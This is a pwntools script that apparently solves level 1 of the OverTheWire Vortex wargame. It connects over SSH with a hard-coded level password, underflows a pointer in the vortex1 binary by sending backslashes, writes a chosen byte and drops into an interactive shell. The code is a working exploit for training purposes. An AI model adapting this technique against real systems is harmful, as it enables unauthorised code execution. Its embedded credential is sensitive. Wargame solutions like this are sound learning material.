from pwn import *
import time

host = "vortex.labs.overthewire.org"
user = "vortex1"
password = "Gq#qu3bF3"
binary = "/vortex/vortex1"

addr_ptr = -0x214
addr_x = -0x210
addr_buff = -0x20c
ptr_init  = addr_buff+0x100

shell = ssh(host=host, user=user, password=password)
r = shell.run(binary)
r.send("\\"*(ptr_init-addr_ptr-3))	# Underflow PTR, -3 so we set the high byte
r.send("\xca")						# Write the byte
r.send("\\")						# Move backward again to undo the ++, might not necessary
r.send("\xca")						# Send any byte, triggers e()
r.interactive()
